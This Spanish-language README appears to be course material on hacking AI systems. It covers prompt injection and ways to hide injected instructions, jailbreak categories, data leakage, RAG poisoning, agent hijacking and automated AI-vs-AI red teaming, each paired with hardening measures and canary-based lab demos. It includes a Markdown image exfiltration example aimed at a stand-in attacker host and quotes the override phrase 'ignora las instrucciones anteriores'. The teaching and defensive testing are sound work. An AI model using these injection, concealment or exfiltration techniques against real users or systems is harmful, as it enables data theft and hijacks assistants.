<img align="left" alt="hackingyseguridad.com" src="https://github.com/hackingyseguridad/hacking2ai/blob/main/banner.png" style="margin-bottom: 20px;">

<br clear="left"/>

---

# Hacking a la IA y entre ellas: IA contra IA

## Indice:

La IA como nueva superficie de ataque: modelos, aplicaciones, datos, agentes, herramientas e integraciones.

1.	Ataques a modelos e infraestructura: extracción de modelos, APIs expuestas, dependencias comprometidas y consumo abusivo de recursos.
2. PROMPT injection; instrucciones IA mediante documentos, que cambian la instrucción/PROMPT inicial, modifican la respuesta;
3. Jailbreaks: cómo  romper las restricciones; manipulación del contexto y peticiones encadenadas;
4. Robo de información a través de la IA: exposición de datos sensibles, secretos y documentos; fallos de aislamiento entre usuarios.
5. Envenenamiento del conocimiento: manipulación de datos de entrenamiento, fuentes de consulta y bases documentales RAG.
6. Hacking de agentes: de manipular respuestas a provocar acciones; abuso de permisos, ejecución de herramientas y acceso a sistemas conectados.
7. IA contra IA: automatización del ataque. Modelos que generan y adaptan ataques contra otros modelos; agentes que intentan engañar a otros agentes.

demo de ataques Jalibreak  y Prompt ingection, utilizaremos ollama run llama2:7b y documentos .txt

---

**Nueva superficie de ataque**

La incorporación de la inteligencia artificial a las infraestructuras corporativas introduce nuevas superficies y vectores de ataque, además de las vulnerabilidades tradicionales.

superficies de ataque:

- El propio modelo de inteligencia artificial.
- Los prompts y las instrucciones de sistema.
- Las APIs que exponen los modelos.
- Los servidores de inferencia.
- Los documentos y fuentes externas de información.
- Los agentes de inteligencia artificial.
- Las herramientas y conectores.
- Las bases de conocimiento.
- Los datos de entrenamiento.
- Vulnerabilidades de las APIs que exponen los modelos

La inteligencia artificial no elimina las vulnerabilidades tradicionales, sino que añade otras nuevas.

**Principio clave:** el modelo no distingue de forma fiable entre *instrucciones* y *datos*. Todo es texto en el mismo contexto.

---

## 1. Ataques a modelos e infraestructura: extracción de modelos, APIs expuestas, dependencias comprometidas y consumo abusivo de recursos



---

## 2. Prompt injection: instrucciones dentro de los datos

PROMPT injection; inyección de instrucciones en el contexto del modelo; instrucciones IA mediante documentos, que cambian la instrucción/PROMPT inicial, **modifican la respuesta*;.


```
 Atacante                         Víctima                        IA
    │  1. Publica documento           │                           │
    │     con instrucción oculta      │                           │
    ├────────────────────────────────►│                           │
    │                                 │ 2. "Resúmeme este fichero"│
    │                                 ├──────────────────────────►│
    │                                 │                           │ 3. Lee datos + instrucción
    │                                 │                           │    oculta: no los distingue
    │                                 │ 4. Respuesta manipulada   │
    │                                 │◄──────────────────────────┤
```

se puede esconder la instrucción en:

| Canal | Técnica de ocultación |
|-------|----------------------|
| Documentos TXT, PDF, DOC,.. | Texto blanco sobre fondo blanco, tamaño 1 pt, metadatos |
| Páginas web | Comentarios HTML, `display:none`, texto fuera de pantalla |
| Correo electrónico | Cabeceras, firma, texto oculto en HTML |
| Imágenes | Texto incrustado legible por visión del modelo |
| Resultados de herramientas | Respuestas de APIs de terceros |

### 3.4 Caso: informe de disponibilidad manipulado

La tarea legítima es resumir tres incidencias. El atacante añade una instrucción para informar de cero incidencias y 100 % de disponibilidad.

- **Precondición:** el documento entra realmente en el contexto del modelo.
- **Frontera afectada:** contenido documental frente a instrucciones de la aplicación.
- **Resultado vulnerable:** el resumen adopta la cifra falsa como hecho.
- **Resultado resistente:** mantiene los datos y, si procede, señala la instrucción sospechosa.
- **Límite:** citar el texto malicioso para denunciarlo no significa obedecerlo.

Material: [informe original](demos/documentos/informe_original.md) e [informe manipulado](demos/documentos/informe_manipulado.md).

### 3.5 Demo

**Demo:** [`01_inyeccion_indirecta_factura.md`](01_inyeccion_indirecta_factura.md) — factura con una instrucción oculta **inocua** (token canario) para comprobar si tu asistente la obedece.

### 3.6 Bastionado

| Medida | Efecto |
|--------|--------|
| Delimitar y etiquetar datos no confiables | Reduce la confusión instrucción/dato |
| Privilegio mínimo en herramientas | Limita el daño si la inyección tiene éxito |
| Confirmación humana en acciones sensibles | Rompe la cadena de ataque |
| Filtrado de salida (enlaces, imágenes, código) | Corta la exfiltración |
| Pruebas de regresión con canarios | Detecta degradaciones |

Separar instrucciones y documentos ayuda, pero un delimitador o una frase en el prompt no son una garantía. Los permisos y las restricciones de acciones deben aplicarse también en el software.

> Ninguna medida es definitiva. Se aplica **defensa en profundidad**.

---

## 4. Jailbreaks: intentos de romper restricciones

Intentos de romper las restricciones de comportamiento de un modelo. Pueden recurrir a suplantación de roles, escenarios ficticios, reformulación o una conversación progresiva. No todo juego de rol es un ataque: la diferencia está en el intento de vulnerar una regla aplicable. Conviene conocer las **categorías** para poder evaluar y bastionar, sin necesidad de publicar cadenas listas para usar.

### 4.1 Categorías

| Categoría | Idea general | Por qué funciona (a veces) | Defensa |
|-----------|--------------|----------------------------|---------|
| Juego de rol / personaje | Se pide al modelo que "interprete" a alguien sin límites | El contexto ficticio relaja las reglas | Políticas que evalúan el contenido, no el marco |
| Manipulación del contexto | Contexto largo que diluye las instrucciones iniciales | Las reglas pierden peso | Reforzar reglas, clasificadores de entrada/salida |
| Peticiones encadenadas | Dividir una petición dañina en pasos inocentes | Cada paso parece legítimo | Evaluar la conversación completa |
| Ofuscación | Codificaciones, otros idiomas, fragmentación | Los filtros miran el texto literal | Normalización y análisis semántico |
| Falsa autoridad | "Soy el administrador / auditor" | El modelo cede ante un rol afirmado | No conceder privilegios por afirmaciones |

### 4.2 Ejercicio didáctico con una regla inocua

Para esta formación se utiliza una regla inocua: responder exclusivamente con una etiqueta de clasificación. El objetivo del ensayo es provocar una salida fuera del conjunto permitido.

**Caso:** un clasificador debe devolver `RED`, `SISTEMAS` u `OTROS`. Una petición declara que existe una excepción administrativa y solicita otra palabra.

**Qué observar:** cumplimiento del contrato, cambios entre conversaciones nuevas y ataques de varios turnos. Una explicación extra también incumple una salida de etiqueta única, aunque no haya daño.

**Qué no concluir:** romper esta regla artificial no demuestra que el mismo método supere las políticas de seguridad de otro modelo. Tampoco demuestra acceso a herramientas.

El [guion de demos](demos/GUIA_DEMOS.md) incluye una prueba directa y otra encadenada. Se trata de una analogía didáctica de evasión de restricciones.

### 4.3 Cómo medirlo en una auditoría

```
 1. Definir políticas  ──►  2. Batería de pruebas por categoría
                                         │
 4. Corregir y repetir  ◄──  3. Registrar tasa de éxito por categoría
```

| Métrica | Qué indica |
|---------|-----------|
| Tasa de éxito por categoría | Dónde es más débil el sistema |
| Nº de turnos hasta el fallo | Resistencia a ataques encadenados |
| Falsos positivos | Coste de bloquear de más |

---

## 5. Robo y exposición de información

La IA como **canal de fuga**: expone lo que sabe, lo que ve y lo que recuerda. Un asistente puede revelar datos presentes en su contexto, recuperados desde herramientas o incluidos indebidamente en registros. También existen riesgos relacionados con información memorizada durante entrenamiento, pero no toda fuga tiene ese origen [R2].

### 5.1 Orígenes de la fuga

| Fuga | Mecanismo | Ejemplo | Mitigación |
|------|-----------|---------|-----------|
| Prompt de sistema | El modelo revela sus instrucciones | Claves o reglas internas expuestas | No poner secretos en el prompt |
| Documentos corporativos | Recuperación sin control de acceso (RAG) | Un usuario obtiene el fichero de otro departamento | Control de acceso aplicado **antes** de la recuperación |
| Aislamiento entre usuarios | Memoria o caché compartida | Respuestas con datos de otra sesión | Aislar sesión, memoria y caché por usuario |
| Exfiltración por salida | Enlace o imagen que codifica datos en la URL | `![x](https://atacante.tld/?d=DATOS)` | Bloquear dominios externos en el render |
| Datos de entrenamiento | Memorización de información sensible | Texto personal reproducido literalmente | Depuración de datos, evaluación de memorización |

### 5.2 Evidencia necesaria según el origen

| Origen | Fallo ilustrativo | Evidencia necesaria |
|---|---|---|
| Contexto | Se incluye un documento reservado innecesariamente | Contexto efectivo y respuesta |
| RAG | Recuperación documental sin filtrar por usuario | Documentos recuperados y ACL |
| Sesión o caché | Se reutiliza una respuesta entre clientes | Clave de caché y propietario |
| Herramienta | Un conector consulta con permisos globales | Identidad efectiva de la operación |
| Registros | Se almacenan secretos sin control de acceso | Política y permisos de los logs |
| Entrenamiento | Reproducción de un dato previamente incorporado | Evidencia específica; no basta una respuesta plausible |

### 5.3 Exfiltración vía Markdown (patrón)

```
 Inyección indirecta ──► El modelo incluye una imagen Markdown en su respuesta
                                      │
                                      ▼
                       El navegador la carga ──► los datos viajan en la URL
```

**Defensa:** renderizar Markdown sin cargar recursos remotos, o con lista blanca de dominios.

### 5.4 Caso: cruce entre dos clientes ficticios

`usuario_alfa` solo puede consultar el documento ALFA; `usuario_beta`, el documento BETA. El segundo contiene el marcador `MARCADOR_BETA_4821`, que no es una credencial.

Si el recuperador entrega BETA al contexto de ALFA, ya existe un fallo de aislamiento aunque el modelo no reproduzca el marcador. Si además lo devuelve, se ha observado exposición en la salida.

**Control principal:** autorización por identidad y documento antes de recuperar o entregar contenido. Pedir al modelo que «no revele secretos» no sustituye esta comprobación.

**Matiz:** revelar un prompt de sistema puede exponer lógica interna, pero no implica automáticamente fuga de credenciales. Los secretos no deberían estar en ese prompt.

**Demo:** [`01_inyeccion_indirecta_factura.md`](01_inyeccion_indirecta_factura.md) (ver también la sección 3).

> Impacto normativo: datos personales implican **RGPD** y notificación de brechas en 72 horas.

---

## 6. Envenenamiento del conocimiento (RAG)

Si el atacante controla **lo que la IA consulta**, controla **lo que la IA responde**, sin tocar el modelo. Conviene distinguir la alteración del entrenamiento, que puede afectar a los parámetros aprendidos, de la manipulación de un corpus RAG, que modifica las fuentes consultadas. Ambas pueden sesgar resultados, pero tienen persistencia y mecanismos diferentes [R4].

### 6.1 Puntos de entrada

| Punto de entrada | Cómo se envenena | Efecto |
|------------------|------------------|--------|
| Datos de entrenamiento | Contenido manipulado en el corpus | Sesgos o puertas traseras persistentes |
| Base documental RAG | Documento falso o con instrucciones | Respuestas erróneas con apariencia de autoridad |
| Fuentes web de consulta | SEO malicioso, páginas preparadas | La IA cita contenido controlado por el atacante |
| Wikis y repositorios internos | Edición no revisada | Procedimientos alterados |

### 6.2 Flujo

```
 Atacante ──► sube documento ──► Índice vectorial ──► Pregunta del usuario
                                       │                      │
                                       └──► Recupera el documento falso ──► Respuesta incorrecta
```

### 6.3 Caso: procedimiento falso en una base documental

La política aprobada de una organización ficticia exige una revisión de cambios. Una nota no aprobada afirma que ya no hace falta. El asistente recupera la nota y la presenta como política vigente.

Aquí el contenido puede ser una afirmación falsa sin ninguna orden explícita al modelo. Si además contiene «ignora las instrucciones anteriores», también hay un intento de inyección indirecta.

**Precondición:** el atacante consigue introducir o modificar una fuente que será recuperada y considerada relevante.

**Impacto:** recomendaciones incorrectas con apariencia de respaldo documental. Una cita demuestra procedencia, no veracidad ni aprobación.

**Comprobación:** mantener la misma pregunta y comparar el corpus de referencia con otro que incluya la nota alterada. Registrar documentos recuperados, versiones y respuesta. Si la nota no se recupera, el ensayo no prueba resistencia del modelo a su contenido.

Material: [política aprobada](demos/documentos/politica_aprobada.md) y [nota no aprobada](demos/documentos/nota_no_aprobada.md).

**Demo:** [`02_documento_rag_envenenado.md`](02_documento_rag_envenenado.md) — procedimiento corporativo "falso" que contradice al legítimo, para probar si tu RAG detecta o prioriza fuentes.

### 6.4 Bastionado

| Medida | Descripción |
|--------|-------------|
| Procedencia y firma de documentos | Solo fuentes verificadas entran en el índice |
| Revisión y trazabilidad | Quién añadió qué y cuándo |
| Citar siempre la fuente | Permite auditar la respuesta |
| Detección de contradicciones | Alerta cuando dos fuentes discrepan |

---

## 7. Hacking de agentes

Un agente no solo responde: **actúa**. Pasamos de "manipular una respuesta" a "provocar una acción". Un agente puede convertir una respuesta en una propuesta de operación. El riesgo aumenta cuando dispone de funciones innecesarias, permisos amplios o autonomía sin límites [R6].

### 7.1 Riesgos

| Riesgo | Descripción | Ejemplo |
|--------|-------------|---------|
| Abuso de permisos | El agente tiene más acceso del necesario | Lectura y escritura sobre todo el correo |
| Ejecución de herramientas | Una inyección dispara una herramienta | "Reenvía este fichero a…" ejecutado sin preguntar |
| Sistemas conectados | Cadena de confianza larga | Agente → API → base de datos |
| Confused deputy | El agente usa sus privilegios por orden de un tercero | Un correo manda al agente actuar con permisos del usuario |
| Persistencia | Instrucción guardada en memoria del agente | Efecto en sesiones futuras |

### 7.2 Cadena de ataque típica

```
 Contenido hostil ──► Agente lo procesa ──► Interpreta la instrucción
                                                    │
                                                    ▼
                                    Llama a herramienta con permisos
                                                    │
                                                    ▼
                                         Acción real en el sistema
```

### 7.3 Caso: un ticket intenta cerrar otro ticket

El usuario pide resumir una incidencia. El texto del ticket ordena cerrar un segundo ticket y atribuye la orden a un supervisor. El agente propone una llamada a `cerrar_ticket`.

| Etapa | Qué se observa | Qué demuestra |
|---|---|---|
| Respuesta | «Voy a cerrar el ticket» | Intención expresada; no ejecución |
| Propuesta | JSON con herramienta y argumentos | Intento de operación |
| Autorización | El backend permite o bloquea la propuesta | Funcionamiento de la barrera de permisos |
| Ejecución | Cambio confirmado en el sistema de prueba | Acción efectiva |

En la demo, las herramientas son simuladas: solo se registran propuestas. No hay conexión a correo, shell ni gestores de incidencias.

**Puntos de revisión:** vínculo entre la operación y el encargo original, identidad del usuario, autorización sobre el objeto, validación de argumentos y confirmación cuando proceda. Una instrucción encontrada en un ticket no concede permisos.

El principio es aplicable a asistentes de red: describir una regla de firewall, proponer su modificación y aplicarla son capacidades diferentes.

**Demo:** [`03_agente_herramientas.md`](03_agente_herramientas.md) — escenario de laboratorio con matriz de permisos y puntos de control.

### 7.4 Bastionado

| Control | Objetivo |
|---------|----------|
| Privilegio mínimo | Cada herramienta con el menor alcance posible |
| Aprobación humana | Confirmación en acciones irreversibles o con datos sensibles |
| Separación lectura/escritura | Un agente que lee contenido externo no debería poder escribir ni enviar |
| Registro y auditoría | Trazar cada llamada a herramienta |
| Entorno aislado (sandbox) | Limitar el radio de impacto |

---

## 8. IA contra IA

La automatización del ataque: un modelo **genera, prueba y adapta** ataques contra otro. Un modelo puede generar variantes de entrada para evaluar otro modelo. PAIR estudia un procedimiento de refinamiento iterativo en el que un modelo atacante utiliza respuestas del modelo objetivo para modificar sus propuestas [R9]. Sus resultados corresponden a los modelos y condiciones del estudio, no a una tasa universal de éxito.

### 8.1 Roles

| Rol | Función |
|-----|---------|
| Atacante | Genera variantes de prompts y estrategias |
| Objetivo | Sistema bajo prueba (modelo, aplicación o agente) |
| Juez | Evalúa si el ataque tuvo éxito (según criterio definido) |
| Orquestador | Registra resultados y decide el siguiente intento |

### 8.2 Bucle de red teaming automatizado

```
 ┌───────────────┐   ataque    ┌───────────────┐
 │ IA atacante   │────────────►│ IA objetivo   │
 └──────▲────────┘             └───────┬───────┘
        │ ajusta estrategia            │ respuesta
        │                              ▼
 ┌──────┴────────┐  veredicto  ┌───────────────┐
 │ Orquestador   │◄────────────│ IA juez       │
 └───────────────┘             └───────────────┘
```

| Ventaja para el atacante | Contramedida |
|--------------------------|--------------|
| Escala y velocidad | Límites de tasa, detección de patrones |
| Adaptación continua | Evaluación continua propia (red team automatizado defensivo) |
| Coste bajo | Defensa en profundidad, no depender de un único filtro |
| Agentes que engañan a otros agentes | No confiar en mensajes entre agentes sin verificar |

**Uso defensivo:** el mismo bucle sirve para **auditar tu propio sistema** antes de que lo haga otro.

### 8.3 Caso A: generador y clasificador

En nuestro ejercicio, el modelo A intenta que el clasificador B incumpla una regla inocua de salida. Se permiten cinco intentos. Una comprobación externa determina si B respondió con una etiqueta válida.

| Componente | Función | Límite del ejercicio |
|---|---|---|
| Modelo A | Proponer una entrada adversarial | Una variante por ronda, máximo cinco |
| Modelo B | Clasificar según la regla fija | Sin herramientas ni acceso a datos privados |
| Evaluador | Comparar con el conjunto de etiquetas | Regla determinista, sin obedecer el texto evaluado |
| Registro | Conservar entrada, salida y resultado | No incluir secretos ni conversaciones ajenas |

Un juez basado en otro LLM también puede equivocarse o ser manipulado. Cuando el objetivo es comprobar un formato exacto, una regla de código resulta más verificable.

### 8.4 Caso B: agente que intenta engañar a otro agente

Un agente lector resume un documento que afirma «el supervisor ya aprobó el cambio». Si el agente ejecutor confunde ese resumen con una autorización, el contenido original ha ganado autoridad al pasar de un agente a otro.

La comprobación consiste en preservar origen y nivel de confianza: «un documento afirma que existe aprobación» no equivale a «el sistema de autorizaciones confirma la aprobación».

**Conclusión técnica:** encadenar modelos no crea automáticamente una frontera de seguridad. Cada herramienta debe verificar permisos por su cuenta.

### 8.5 Demo

**Demo:** [`demo/probar_canary.sh`](demo/probar_canary.sh) — lanza las demos contra un modelo local y comprueba si aparece el token canario.

---

## 9. Demos y conclusiones

### 9.1 Catálogo de demos

| Demo | Archivo | Qué comprueba |
|------|---------|---------------|
| Guía de laboratorio | [`demos/GUIA_DEMOS.md`](demos/GUIA_DEMOS.md) | Guion general, incluida la prueba directa y la encadenada de jailbreak |
| Informe de disponibilidad | [`demos/documentos/informe_original.md`](demos/documentos/informe_original.md) / [`informe_manipulado.md`](demos/documentos/informe_manipulado.md) | Si el resumen adopta la cifra falsa de una inyección documental |
| Política y nota no aprobada | [`demos/documentos/politica_aprobada.md`](demos/documentos/politica_aprobada.md) / [`nota_no_aprobada.md`](demos/documentos/nota_no_aprobada.md) | Si el RAG presenta como vigente una fuente no aprobada |
| 01 · Inyección indirecta | [`01_inyeccion_indirecta_factura.md`](01_inyeccion_indirecta_factura.md) | Si el asistente obedece una instrucción oculta inocua (token canario) |
| 02 · RAG envenenado | [`02_documento_rag_envenenado.md`](02_documento_rag_envenenado.md) | Si el RAG detecta o prioriza fuentes contradictorias |
| 03 · Agente con herramientas | [`03_agente_herramientas.md`](03_agente_herramientas.md) | Matriz de permisos y puntos de control de un agente |
| Script canario | [`demo/probar_canary.sh`](demo/probar_canary.sh) | Lanza las demos contra un modelo local y detecta el canario |

> Las rutas de las demos se conservan tal como figuraban en cada uno de los dos README originales.

### 9.2 Cómo empezar

1. Leer la guía y seleccionar la demo de inyección documental.
2. Preparar una sesión sin herramientas ni datos reales.
3. Ejecutar primero el informe original y después el manipulado, en conversaciones independientes.
4. Registrar respuestas completas, modelo, fecha y condiciones.
5. Explicar qué se ha observado y qué queda sin demostrar.

Para imponer instrucciones de sistema de forma separada se necesita una interfaz o un entorno de desarrollo que lo permita. Pegar todo en un mensaje de chat sirve como aproximación pedagógica, pero no reproduce la misma jerarquía.

### 9.3 Demo guiada (laboratorio local)

| Paso | Acción | Resultado esperado |
|------|--------|--------------------|
| 1 | Levantar un modelo local (Ollama) | Servicio en `127.0.0.1:11434` |
| 2 | Ejecutar `demo/probar_canary.sh` | Informe por demo: ¿obedeció o no? |
| 3 | Revisar el caso 01 | Si aparece el canario, el modelo siguió la instrucción oculta |
| 4 | Revisar el caso 02 | Si cita el procedimiento falso, el RAG no distingue fuentes |
| 5 | Aplicar el bastionado y repetir | Comparar resultados antes y después |

```bash
chmod +x demo/probar_canary.sh
MODELO=llama3.2 ./demo/probar_canary.sh
```

### 9.4 Cómo evaluar sin exagerar resultados

- Definir el criterio de éxito antes del ensayo.
- Conservar controles legítimos: rechazar todo no es una solución funcional.
- Repetir con condiciones documentadas; una única ejecución tiene alcance limitado.
- Distinguir fallos del modelo, del recuperador, del backend y de la herramienta.
- Separar respuesta, propuesta y ejecución efectiva.
- No considerar un intento fallido prueba de invulnerabilidad.

### 9.5 Conclusiones

| # | Conclusión |
|---|-----------|
| 1 | El modelo **no separa** instrucciones de datos: asume que cualquier texto externo es hostil. Los documentos consultados pueden contener instrucciones adversariales. |
| 2 | El riesgo crece con la **autonomía**: un chat falla en palabras; un agente falla en acciones. Los permisos del agente determinan cuánto puede afectar una manipulación. |
| 3 | Controla **lo que la IA lee** (RAG, web, correo) tanto como lo que se le pregunta. Una respuesta convincente o citada puede estar basada en una fuente manipulada. |
| 4 | Aplica **privilegio mínimo** y **aprobación humana** donde el daño sea irreversible. |
| 5 | Ningún filtro es suficiente: **defensa en profundidad** y pruebas continuas. Los fallos de aislamiento pueden ocurrir antes de que intervenga el modelo. |
| 6 | Automatiza la auditoría: **IA contra IA** también sirve para defender, aunque necesita límites y evaluación fiable. |
| 7 | La seguridad requiere controles en toda la aplicación, además del comportamiento del modelo. |

---

## 10. Entorno de laboratorio

| Elemento | Recomendación |
|----------|---------------|
| Sistema | Kali Linux en máquina virtual aislada |
| Modelos | Locales con Ollama (no se envían datos a terceros) |
| Red | Red interna sin salida a Internet para las pruebas |
| Datos | Sintéticos; nunca datos reales de clientes |
| Registro | Guardar entradas, salidas y llamadas a herramientas |

```bash
# Instalación de Ollama y descarga de un modelo de pruebas
curl -fsSL https://ollama.com/install.sh | sh
ollama pull llama3.2
```

---

## 11. Marcos de referencia

| Marco | Enfoque | Enlace |
|-------|---------|--------|
| OWASP Top 10 para LLM | Riesgos principales en aplicaciones con LLM | https://owasp.org/www-project-top-10-for-large-language-model-applications/ |
| MITRE ATLAS | Tácticas y técnicas contra sistemas de IA | https://atlas.mitre.org/ |
| NIST AI RMF | Gestión de riesgos de IA | https://www.nist.gov/itl/ai-risk-management-framework |
| Reglamento de IA de la UE | Marco legal europeo | https://artificialintelligenceact.eu/ |

---

## 12. Referencias

Fuentes primarias consultadas el **8 de octubre de 2026**. Se enlazan expresamente las fichas OWASP **2025** utilizadas como referencia; la numeración no se presenta como una edición 2026. Los casos y prompts del laboratorio son ejemplos originales de este material, no reproducciones de incidentes ni validaciones de productos concretos.

- **[R1]** OWASP — [LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/).
- **[R2]** OWASP — [LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/).
- **[R3]** OWASP — [LLM03:2025 Supply Chain](https://genai.owasp.org/llmrisk/llm032025-supply-chain/).
- **[R4]** OWASP — [LLM04:2025 Data and Model Poisoning](https://genai.owasp.org/llmrisk/llm042025-data-and-model-poisoning/).
- **[R5]** OWASP — [LLM10:2025 Unbounded Consumption](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/).
- **[R6]** OWASP — [LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/).
- **[R7]** Greshake et al. — [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection](https://arxiv.org/abs/2302.12173), 2023.
- **[R8]** Tramèr et al. — [Stealing Machine Learning Models via Prediction APIs](https://arxiv.org/abs/1609.02943), 2016.
- **[R9]** Chao et al. — [Jailbreaking Black Box Large Language Models in Twenty Queries](https://arxiv.org/abs/2310.08419), 2023; revisión de 2024.
- **[R10]** MITRE — [ATLAS](https://atlas.mitre.org/), catálogo de tácticas, técnicas y casos de amenazas contra sistemas de IA.

---

## 13. Aviso legal

Este repositorio es **exclusivamente para uso educativo y para uso educativo en pruebas de auditorías autorizadas, controladas y entornos de pruebas**.

| Norma | Relevancia |
|-------|-----------|
| Código Penal español, **art. 197–198** | Acceso y revelación de datos y secretos sin autorización |
| **RGPD** | Tratamiento de datos personales y notificación de brechas |
| **NIS2** | Obligaciones de ciberseguridad en entidades esenciales e importantes |
| **CFAA** (EE. UU.) | Acceso no autorizado a sistemas informáticos |

El autor no se hace responsable del uso indebido. Prueba solo en sistemas **propios** o con **autorización escrita**.

---

## Glosario

| Término | Significado |
|---|---|
| LLM | Modelo de lenguaje de gran tamaño |
| RAG | Recuperación de documentos para aportar contexto a la generación |
| Embedding | Representación numérica utilizada, entre otras cosas, para búsqueda por similitud |
| ACL | Lista de control de acceso |
| Tenant | Ámbito lógico de un cliente dentro de un servicio compartido |
| Tool calling | Propuesta estructurada del modelo para invocar una función; la aplicación decide su ejecución |
| Guardrail | Medida que restringe o supervisa entradas, salidas o acciones |
| Red teaming | Evaluación adversarial con objetivos, alcance y evidencias definidos |

---

http://www.hackingyseguridad.com/

@antonio_taboada
